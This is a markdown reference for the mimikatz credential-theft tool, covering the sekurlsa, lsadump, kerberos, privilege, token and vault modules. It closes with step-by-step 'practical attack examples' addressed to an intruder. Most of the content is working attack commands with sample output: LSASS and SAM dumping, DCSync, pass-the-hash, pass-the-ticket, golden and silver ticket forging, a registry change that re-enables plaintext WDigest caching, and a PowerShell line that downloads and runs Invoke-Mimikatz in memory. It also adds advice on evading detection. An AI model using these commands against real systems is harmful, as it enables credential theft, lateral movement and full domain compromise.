# mimikatz Modules Reference

Comprehensive documentation for mimikatz modules including sekurlsa, lsadump, kerberos, privilege, token, and vault.

## Table of Contents

- [Prerequisites](#prerequisites)
- [sekurlsa Module](#sekurlsa-module)
- [lsadump Module](#lsadump-module)
- [kerberos Module](#kerberos-module)
- [privilege Module](#privilege-module)
- [token Module](#token-module)
- [vault Module](#vault-module)
- [Practical Attack Examples](#practical-attack-examples)

---

## Prerequisites

Most mimikatz operations require elevated privileges:

```
# Always run as Administrator
# Enable debug privileges first
privilege::debug

# Expected output: Privilege '20' OK
```

---

## sekurlsa Module

The `sekurlsa` module extracts credentials from LSASS (Local Security Authority Subsystem Service) memory. This is the primary module for credential extraction.

### Commands Overview

| Command | Description |
|---------|-------------|
| `logonpasswords` | Dump all available credentials (passwords, hashes, tickets) |
| `wdigest` | Extract WDigest credentials (plaintext on older systems) |
| `kerberos` | List Kerberos credentials |
| `tspkg` | Extract TsPkg (Terminal Services) credentials |
| `livessp` | Extract LiveSSP credentials |
| `ssp` | Extract SSP credentials |
| `msv` | Extract MSV credentials (NTLM hashes) |
| `tickets` | Export Kerberos tickets |
| `ekeys` | Extract Kerberos encryption keys |
| `dpapi` | Extract DPAPI cached master keys |
| `minidump` | Switch to minidump context |
| `pth` | Pass-the-Hash |
| `krbtgt` | Inject krbtgt keys |
| `dpapisystem` | Extract DPAPI_SYSTEM LSA secret |
| `trust` | Extract trust keys |
| `backupkeys` | Extract DPAPI domain backup key |
| `cloudap` | Extract Azure AD credentials |

### logonpasswords

Dumps all available logon credentials from memory including plaintext passwords (if available), NTLM hashes, and Kerberos tickets.

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WORKSTATION$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 12/27/2025 10:30:00 AM
SID               : S-1-5-18
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : e02bc503339d51f71d913c245d35b50b9e2c6c46
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : CORP
         * Password : P@ssw0rd123!
        kerberos :
         * Username : Administrator
         * Domain   : CORP.LOCAL
         * Password : P@ssw0rd123!
```

### wdigest

Extracts WDigest credentials specifically. On Windows 8.1+ and Server 2012 R2+, WDigest is disabled by default.

```
mimikatz # sekurlsa::wdigest

Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : jsmith
Domain            : CORP
Logon Server      : DC01
Logon Time        : 12/27/2025 10:30:00 AM
SID               : S-1-5-21-1234567890-1234567890-1234567890-1001
        wdigest :
         * Username : jsmith
         * Domain   : CORP
         * Password : UserP@ssword!
```

**Note**: To re-enable WDigest credential caching on newer systems (requires reboot or new logon):
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

### kerberos

Lists Kerberos credentials in memory.

```
mimikatz # sekurlsa::kerberos

Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : administrator
Domain            : CORP.LOCAL
Logon Server      : DC01
SID               : S-1-5-21-1234567890-1234567890-1234567890-500
         * Username : administrator
         * Domain   : CORP.LOCAL
         * Password : (null)
```

### msv

Extracts MSV credentials (NTLM hashes) specifically.

```
mimikatz # sekurlsa::msv

Authentication Id : 0 ; 123456
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : e02bc503339d51f71d913c245d35b50b9e2c6c46
         * LM       : (empty)
```

### tickets

Lists and exports Kerberos tickets from memory.

```
# List tickets
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 123456
         * Username : administrator @ CORP.LOCAL
         * Domain   : CORP.LOCAL

           Group 0 - Ticket Granting Service
            [00000000]
              Start/End/MaxRenew: 12/27/2025 10:30:00 ; 12/27/2025 20:30:00 ; 1/3/2026 10:30:00
              Service Name (02) : cifs ; fileserver.corp.local ; @ CORP.LOCAL
              Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable

           Group 1 - Client Ticket
           Group 2 - Ticket Granting Ticket
            [00000000]
              Service Name (02) : krbtgt ; CORP.LOCAL ; @ CORP.LOCAL

# Export all tickets
mimikatz # sekurlsa::tickets /export
```

### ekeys

Extracts Kerberos encryption keys (AES, DES, RC4).

```
mimikatz # sekurlsa::ekeys

Authentication Id : 0 ; 123456
Session           : Interactive from 1
User Name         : Administrator
Domain            : CORP
         * Username : Administrator
         * Domain   : CORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac : 5a3ed3b4f5c7e9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f
           aes128_hmac : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
           rc4_hmac_nt : 8846f7eaee8fb117ad06bdd830b7586c
```

### minidump

Analyze credentials from a minidump file (offline analysis).

```
# First, switch to minidump context
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

# Then run credential extraction
mimikatz # sekurlsa::logonpasswords
```

### pth (Pass-the-Hash)

Injects NTLM credentials to run a process as another user.

```
# Pass-the-Hash with NTLM
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe

# Pass-the-Hash with AES256 key (Over-Pass-the-Hash / Pass-the-Key)
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /aes256:5a3ed3b4f5c7e9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f /run:cmd.exe

# Specify DC (LUID)
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe /dc:dc01.corp.local
```

---

## lsadump Module

The `lsadump` module extracts credentials from the LSA (Local Security Authority) database, SAM, and Active Directory.

### Commands Overview

| Command | Description |
|---------|-------------|
| `sam` | Dump local SAM database (local accounts) |
| `secrets` | Dump LSA secrets |
| `cache` | Dump cached domain credentials (DCC2) |
| `lsa` | Ask LSA Server for credentials |
| `trust` | Ask LSA Server for trust relationships |
| `backupkeys` | Ask LSA Server for backup keys |
| `dcsync` | Replicate DC credentials (AD attack) |
| `netsync` | Sync from DC using Netlogon |
| `setntlm` | Set NTLM hash for a user |
| `changentlm` | Change NTLM hash for a user |
| `zerologon` | Zerologon attack |

### sam

Dumps the local SAM database containing local user hashes. Requires SYSTEM privileges.

```
# Elevate to SYSTEM first
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::sam

Domain : WORKSTATION
SysKey : 1234567890abcdef1234567890abcdef
Local SID : S-1-5-21-1234567890-1234567890-1234567890

SAMKey : abcdef1234567890abcdef1234567890

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

RID  : 000001f5 (501)
User : Guest
  Hash NTLM: <disabled>

RID  : 000003e8 (1000)
User : localadmin
  Hash NTLM: a4f49c406510bdcab6824ee7c30fd852

# From offline registry hives
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM
```

### secrets

Dumps LSA secrets including service account passwords, auto-logon credentials, and other sensitive data.

```
mimikatz # token::elevate
mimikatz # lsadump::secrets

Domain : WORKSTATION
SysKey : 1234567890abcdef1234567890abcdef

Local name : WORKSTATION ( S-1-5-21-... )
Domain name : CORP ( S-1-5-21-... )

Policy subsystem is : 1.18
LSA Key(s) : 1, default {abcdef12-3456-7890-abcd-ef1234567890}
  [00] {abcdef12-3456-7890-abcd-ef1234567890}

Secret  : DefaultPassword
cur/text: AutoLogonP@ssword!

Secret  : _SC_SQLService
cur/text: SqlServiceP@ss123!

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 ab cd ef ...
    full: abcdef1234567890...
    m/u : abcdef1234567890... / 1234567890abcdef...
```

### cache

Dumps cached domain logon credentials (Domain Cached Credentials v2 - DCC2/mscash2).

```
mimikatz # token::elevate
mimikatz # lsadump::cache

Domain : WORKSTATION
SysKey : 1234567890abcdef1234567890abcdef

Local name : WORKSTATION ( S-1-5-21-... )
Domain name : CORP ( S-1-5-21-... )

* Iteration is set to default (10240)

[NL$1 - 12/27/2025 10:30:00]
RID       : 00000450 (1104)
User      : CORP\jsmith
MsCacheV2 : $DCC2$10240#jsmith#a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6

[NL$2 - 12/26/2025 15:45:00]
RID       : 00000451 (1105)
User      : CORP\administrator
MsCacheV2 : $DCC2$10240#administrator#abcdef1234567890abcdef1234567890
```

**Note**: DCC2 hashes can be cracked offline with hashcat mode 2100.

### lsa

Asks the LSA Server for credentials directly (requires elevated privileges).

```
mimikatz # lsadump::lsa /patch

Domain : CORP / S-1-5-21-1234567890-1234567890-1234567890

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 8846f7eaee8fb117ad06bdd830b7586c

RID  : 000001f5 (501)
User : Guest

RID  : 000001f6 (502)
User : krbtgt
NTLM : abcdef1234567890abcdef1234567890

# Inject into LSASS (more stealthy)
mimikatz # lsadump::lsa /inject
```

### dcsync

Simulates a Domain Controller to request password data via Directory Replication Service (DRS). Requires domain admin or specific replication rights.

```
# DCSync single user
mimikatz # lsadump::dcsync /user:Administrator /domain:corp.local

[DC] 'corp.local' will be the domain
[DC] 'DC01.corp.local' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 12/15/2025 10:30:00 AM
Object Security ID   : S-1-5-21-1234567890-1234567890-1234567890-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c
    ntlm- 0: 8846f7eaee8fb117ad06bdd830b7586c
    lm  - 0: aad3b435b51404eeaad3b435b51404ee

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : abcdef1234567890...

* Primary:Kerberos-Newer-Keys *
    Default Salt : CORP.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 5a3ed3b4f5c7e9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f
      aes128_hmac       (4096) : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
      des_cbc_md5       (4096) : a1b2c3d4e5f6a7b8

# DCSync krbtgt account (for Golden Ticket attacks)
mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.local

# DCSync all accounts
mimikatz # lsadump::dcsync /all /csv /domain:corp.local

# Specify DC
mimikatz # lsadump::dcsync /user:Administrator /domain:corp.local /dc:DC01.corp.local
```

### trust

Extracts inter-domain and forest trust keys.

```
mimikatz # lsadump::trust /patch

Current domain: CORP.LOCAL (CORP / S-1-5-21-...)

Domain: CHILD.CORP.LOCAL (CHILD / S-1-5-21-...)
 [  In ] CORP.LOCAL -> CHILD.CORP.LOCAL
    * 12/27/2025 - aes256_hmac - abcdef1234...
    * 12/27/2025 - rc4_hmac_nt - 1234567890...
```

---

## kerberos Module

The `kerberos` module handles Kerberos ticket operations including listing, importing, creating, and purging tickets.

### Commands Overview

| Command | Description |
|---------|-------------|
| `list` | List user's Kerberos tickets |
| `tgt` | Display current TGT |
| `purge` | Purge all tickets |
| `ptt` | Pass-the-Ticket |
| `golden` | Create Golden Ticket |
| `silver` | Create Silver Ticket |
| `clist` | List tickets from credentials cache file |
| `hash` | Compute Kerberos keys from password |
| `ptc` | Pass-the-ccache (import from ccache) |
| `ask` | Request a TGS |

### list

Lists Kerberos tickets in the current session.

```
mimikatz # kerberos::list

[00000000] - 0x00000012 - aes256_hmac_md5
   Start/End/MaxRenew: 12/27/2025 10:30:00 ; 12/27/2025 20:30:00 ; 1/3/2026 10:30:00
   Server Name       : krbtgt/CORP.LOCAL @ CORP.LOCAL
   Client Name       : administrator @ CORP.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable

[00000001] - 0x00000012 - aes256_hmac_md5
   Start/End/MaxRenew: 12/27/2025 10:31:00 ; 12/27/2025 20:30:00 ; 1/3/2026 10:30:00
   Server Name       : cifs/fileserver.corp.local @ CORP.LOCAL
   Client Name       : administrator @ CORP.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable

# Export all tickets
mimikatz # kerberos::list /export
```

### purge

Purges all Kerberos tickets from the current session.

```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
```

### ptt (Pass-the-Ticket)

Injects a Kerberos ticket into the current session.

```
# Inject a single ticket
mimikatz # kerberos::ptt ticket.kirbi
* File: 'ticket.kirbi': OK

# Inject multiple tickets
mimikatz # kerberos::ptt C:\tickets\*

# Inject from base64
mimikatz # kerberos::ptt base64_ticket_data
```

### golden (Golden Ticket)

Creates a forged TGT (Ticket Granting Ticket) for any user. Requires the krbtgt hash.

```
# Create Golden Ticket with NTLM hash
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:abcdef1234567890abcdef1234567890 /ticket:golden.kirbi

User      : Administrator
Domain    : corp.local (CORP)
SID       : S-1-5-21-1234567890-1234567890-1234567890
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: abcdef1234567890abcdef1234567890 - rc4_hmac_nt
Lifetime  : 12/27/2025 10:30:00 ; 12/24/2035 10:30:00 ; 12/24/2035 10:30:00
-> Ticket : golden.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

# Create with AES256 key (stealthier)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /aes256:5a3ed3b4f5c7e9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f /ticket:golden_aes.kirbi

# Specify additional groups (Domain Admins, Enterprise Admins, etc.)
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:abcdef1234567890abcdef1234567890 /groups:512,513,518,519,520 /ticket:golden.kirbi

# Create and inject immediately
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:abcdef1234567890abcdef1234567890 /ptt

# Specify custom user ID and start time
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:abcdef1234567890abcdef1234567890 /id:500 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden.kirbi
```

### silver (Silver Ticket)

Creates a forged TGS (Ticket Granting Service) for a specific service. Requires the service account's hash.

```
# Silver Ticket for CIFS (file share access)
mimikatz # kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:fileserver.corp.local /service:cifs /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /ticket:silver_cifs.kirbi

# Silver Ticket for HTTP (web services)
mimikatz # kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:webserver.corp.local /service:http /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /ticket:silver_http.kirbi

# Silver Ticket for HOST (PsExec, WMI, etc.)
mimikatz # kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:server.corp.local /service:host /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /ptt

# Silver Ticket for LDAP (DCSync from non-DC)
mimikatz # kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:dc01.corp.local /service:ldap /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /ptt

# Using computer account hash (for services running as SYSTEM)
mimikatz # kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:server.corp.local /service:cifs /rc4:<computer_account_ntlm> /ptt
```

**Common Service Principal Names (SPNs):**

| Service | SPN | Use Case |
|---------|-----|----------|
| CIFS | cifs/hostname | File shares, SMB |
| HTTP | http/hostname | Web services, WinRM |
| HOST | host/hostname | PsExec, scheduled tasks, WMI |
| LDAP | ldap/hostname | LDAP queries, DCSync |
| MSSQLSvc | mssqlsvc/hostname:port | SQL Server access |
| WSMAN | wsman/hostname | PowerShell Remoting |

### hash

Computes Kerberos keys from a plaintext password.

```
mimikatz # kerberos::hash /user:Administrator /domain:corp.local /password:P@ssw0rd123!

    * rc4_hmac_nt  8846f7eaee8fb117ad06bdd830b7586c
    * aes128_hmac  a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
    * aes256_hmac  5a3ed3b4f5c7e9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f
    * des_cbc_md5  a1b2c3d4e5f6a7b8
```

### ptc (Pass-the-ccache)

Injects tickets from a ccache file (Linux/MIT Kerberos format).

```
mimikatz # kerberos::ptc /path/to/ticket.ccache
```

---

## privilege Module

The `privilege` module manages Windows privileges for the current process.

### Commands Overview

| Command | Description |
|---------|-------------|
| `debug` | Request SeDebugPrivilege |
| `driver` | Request SeLoadDriverPrivilege |
| `security` | Request SeSecurityPrivilege |
| `tcb` | Request SeTcbPrivilege |
| `backup` | Request SeBackupPrivilege |
| `restore` | Request SeRestorePrivilege |
| `sysenv` | Request SeSystemEnvironmentPrivilege |
| `id` | Request a privilege by ID |
| `name` | Request a privilege by name |

### debug

Enables SeDebugPrivilege, required for reading LSASS memory.

```
mimikatz # privilege::debug
Privilege '20' OK

# If it fails:
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
# This means you need to run as Administrator
```

### backup

Enables SeBackupPrivilege for reading protected files.

```
mimikatz # privilege::backup
Privilege '17' OK
```

### restore

Enables SeRestorePrivilege for writing to protected files.

```
mimikatz # privilege::restore
Privilege '18' OK
```

---

## token Module

The `token` module manipulates Windows access tokens for privilege escalation and impersonation.

### Commands Overview

| Command | Description |
|---------|-------------|
| `whoami` | Display current token information |
| `list` | List available tokens |
| `elevate` | Impersonate SYSTEM token |
| `run` | Run a command with an impersonated token |
| `revert` | Revert to original token |

### whoami

Displays information about the current token.

```
mimikatz # token::whoami

 * Process Token : {0;000003e7} 1 F 32296          NT AUTHORITY\SYSTEM              S-1-5-18    (04g,21p)       Primary
 * Thread Token  : no token
```

### list

Lists available tokens on the system.

```
mimikatz # token::list

Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

Token Id  : 1
User name : Administrator
SID name  : CORP\Administrator

Token Id  : 2
User name : jsmith
SID name  : CORP\jsmith
```

### elevate

Impersonates a token, typically to elevate to SYSTEM.

```
# Elevate to SYSTEM
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

# Elevate to Domain Admin (if available)
mimikatz # token::elevate /domainadmin
Token Id  : 0
User name :
SID name  : CORP\Domain Admins

# Elevate to specific user
mimikatz # token::elevate /user:Administrator
```

### run

Runs a command with an impersonated token.

```
# Run cmd as impersonated user
mimikatz # token::run /user:Administrator /command:cmd.exe
```

### revert

Reverts to the original process token.

```
mimikatz # token::revert
 * Process Token : {0;000003e7} 1 F 32296          CORP\Administrator               S-1-5-21-...  Primary
```

---

## vault Module

The `vault` module extracts credentials from Windows Credential Vault (Credential Manager).

### Commands Overview

| Command | Description |
|---------|-------------|
| `list` | List vault entries |
| `cred` | Enumerate credentials |

### cred

Enumerates credentials stored in Credential Manager.

```
mimikatz # vault::cred

TargetName            : Domain:interactive=CORP\administrator
Type                  : Domain Password
User                  : CORP\administrator
Credential            :

TargetName            : LegacyGeneric:target=git:https://github.com
Type                  : Generic
User                  : PersonalAccessToken
Credential            : ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

TargetName            : Domain:interactive=CORP\svc_backup
Type                  : Domain Password
User                  : CORP\svc_backup
Credential            : B@ckupP@ss123!
```

### list

Lists all vault entries.

```
mimikatz # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Web Credentials
        Path       : C:\Users\jsmith\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (2)
                0.  SchemaId            : {3ccd5499-87a8-4b10-a215-608888dd3b55}
                    Type                : Windows Credential
                    Identity            : admin@webmail.corp.local
                    Authenticator       :
                    Resource            : https://webmail.corp.local

                1.  SchemaId            : {3ccd5499-87a8-4b10-a215-608888dd3b55}
                    Type                : Windows Credential
                    Identity            : administrator
                    Resource            : TERMSRV/dc01.corp.local
```

---

## Practical Attack Examples

### Example 1: Complete Credential Extraction on Windows

**Scenario**: You have Administrator access to a Windows workstation and want to extract all credentials.

```
# 1. Launch mimikatz as Administrator
mimikatz.exe

# 2. Enable debug privileges
mimikatz # privilege::debug
Privilege '20' OK

# 3. Dump all logon credentials
mimikatz # sekurlsa::logonpasswords

# 4. Elevate to SYSTEM for additional access
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

# 5. Dump local SAM database
mimikatz # lsadump::sam

# 6. Dump LSA secrets (service passwords, etc.)
mimikatz # lsadump::secrets

# 7. Dump cached domain credentials
mimikatz # lsadump::cache

# 8. Extract Vault credentials
mimikatz # vault::cred

# 9. Export Kerberos tickets
mimikatz # sekurlsa::tickets /export

# 10. Revert token
mimikatz # token::revert
```

**One-liner for command line execution:**
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit"
```

**PowerShell with Invoke-Mimikatz:**
```powershell
# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

---

### Example 2: Pass-the-Hash Attack

**Scenario**: You have an NTLM hash and want to authenticate as that user.

```
# Extract the hash first
mimikatz # sekurlsa::logonpasswords
# Note the NTLM hash: 8846f7eaee8fb117ad06bdd830b7586c

# Pass-the-Hash to spawn a new cmd as that user
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe

# In the new cmd window, verify identity
C:\> whoami
corp\administrator

# Access network resources
C:\> dir \\dc01.corp.local\c$
```

**From command line:**
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe" "exit"
```

---

### Example 3: Pass-the-Ticket Attack

**Scenario**: You have exported a Kerberos ticket and want to use it on another machine.

```
# 1. Export tickets from source machine
mimikatz # sekurlsa::tickets /export
# Creates: [0;12345]-0-0-40e10000-administrator@krbtgt-CORP.LOCAL.kirbi

# 2. Transfer ticket file to target machine

# 3. On target machine, purge existing tickets
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

# 4. Inject the ticket
mimikatz # kerberos::ptt [0;12345]-0-0-40e10000-administrator@krbtgt-CORP.LOCAL.kirbi
* File: '[0;12345]-0-0-40e10000-administrator@krbtgt-CORP.LOCAL.kirbi': OK

# 5. Verify ticket is loaded
mimikatz # kerberos::list

# 6. Access resources (in new cmd window)
C:\> klist
C:\> dir \\dc01.corp.local\c$
```

---

### Example 4: Over-Pass-the-Hash (Pass-the-Key)

**Scenario**: You want to use the AES key instead of NTLM for stealthier authentication.

```
# 1. Extract AES keys
mimikatz # sekurlsa::ekeys

# 2. Note the aes256_hmac key
# aes256_hmac : 5a3ed3b4f5c7e9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f

# 3. Over-Pass-the-Hash using AES256
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /aes256:5a3ed3b4f5c7e9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f /run:powershell.exe

# This requests a TGT using the AES key (more stealthy than NTLM)
# The new PowerShell session will have Kerberos tickets for the target user
```

**Difference from Pass-the-Hash:**
- Pass-the-Hash uses NTLM protocol (RC4)
- Over-Pass-the-Hash uses Kerberos with AES keys
- AES is less likely to trigger security alerts
- AES authentication appears more legitimate in logs

---

### Example 5: Golden Ticket Attack

**Scenario**: You have the krbtgt hash and want persistent domain access.

```
# 1. First, obtain the krbtgt hash via DCSync
mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.local

# Note:
# NTLM: abcdef1234567890abcdef1234567890
# AES256: 5a3ed3b4f5c7e9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f

# 2. Get Domain SID
C:\> whoami /user
# or
mimikatz # lsadump::lsa /patch
# SID: S-1-5-21-1234567890-1234567890-1234567890

# 3. Create Golden Ticket
mimikatz # kerberos::golden /user:GoldenAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:abcdef1234567890abcdef1234567890 /id:500 /groups:512,513,518,519,520 /ticket:golden.kirbi

# 4. Inject the Golden Ticket
mimikatz # kerberos::ptt golden.kirbi

# 5. Access any resource in the domain
C:\> dir \\dc01.corp.local\c$
C:\> dir \\fileserver.corp.local\c$
C:\> psexec.exe \\dc01.corp.local cmd.exe

# Create with AES (stealthier)
mimikatz # kerberos::golden /user:GoldenAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /aes256:5a3ed3b4f5c7e9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f /ptt
```

**Golden Ticket Properties:**
- Valid for 10 years by default
- Works even if user password changes
- Works even if user account is disabled/deleted
- Only invalidated by changing krbtgt password twice

---

### Example 6: Silver Ticket Attack

**Scenario**: You have a service account or computer account hash and want to access a specific service.

```
# 1. Get the target service account/computer hash
# For services running as SYSTEM, use the computer account hash
mimikatz # sekurlsa::logonpasswords
# Computer account: FILESERVER$ - NTLM: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6

# 2. Create Silver Ticket for CIFS service
mimikatz # kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:fileserver.corp.local /service:cifs /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /ptt

# 3. Access the file share
C:\> dir \\fileserver.corp.local\c$

# Silver Ticket for WinRM/PSRemoting
mimikatz # kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:server.corp.local /service:http /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /ptt

mimikatz # kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:server.corp.local /service:wsman /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /ptt

# Now use PowerShell Remoting
Enter-PSSession -ComputerName server.corp.local
```

**Silver Ticket Advantages over Golden Ticket:**
- Doesn't require krbtgt hash (just service account hash)
- Never touches Domain Controller for validation
- Harder to detect (no DC communication)

---

### Example 7: DCSync Attack

**Scenario**: You have domain admin privileges and want to extract all domain credentials.

```
# 1. Ensure you have appropriate privileges
mimikatz # privilege::debug

# 2. DCSync single high-value accounts
mimikatz # lsadump::dcsync /user:Administrator /domain:corp.local
mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.local

# 3. DCSync all accounts (outputs CSV)
mimikatz # lsadump::dcsync /all /csv /domain:corp.local

# 4. DCSync specific account with DC specified
mimikatz # lsadump::dcsync /user:CORP\svc_sql /domain:corp.local /dc:dc01.corp.local

# From command line
mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:corp.local" exit

# Output includes:
# - NTLM hash
# - AES128 and AES256 keys
# - Password history
# - Account metadata
```

**Required Privileges for DCSync:**
- Domain Admin
- Enterprise Admin
- Or accounts with these rights on the domain object:
  - Replicating Directory Changes
  - Replicating Directory Changes All
  - Replicating Directory Changes In Filtered Set

---

### Example 8: Remote Execution via PsExec with Pass-the-Hash

**Scenario**: Combine mimikatz with PsExec for remote command execution.

```
# 1. Pass-the-Hash to get a privileged cmd
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe

# 2. In the new cmd, use PsExec
C:\> PsExec.exe \\dc01.corp.local cmd.exe

# Alternative: Use Impacket's psexec.py with hash
# python3 psexec.py corp.local/Administrator@dc01.corp.local -hashes :8846f7eaee8fb117ad06bdd830b7586c
```

---

### Example 9: Offline Credential Extraction from Memory Dump

**Scenario**: Extract credentials from an LSASS memory dump (from Task Manager or procdump).

```
# 1. Create memory dump (on target)
# Task Manager > Details > lsass.exe > Right-click > Create dump file
# Or: procdump.exe -ma lsass.exe lsass.dmp

# 2. Transfer lsass.dmp to analysis machine

# 3. Analyze with mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords

# Extract all credential types
mimikatz # sekurlsa::msv
mimikatz # sekurlsa::wdigest
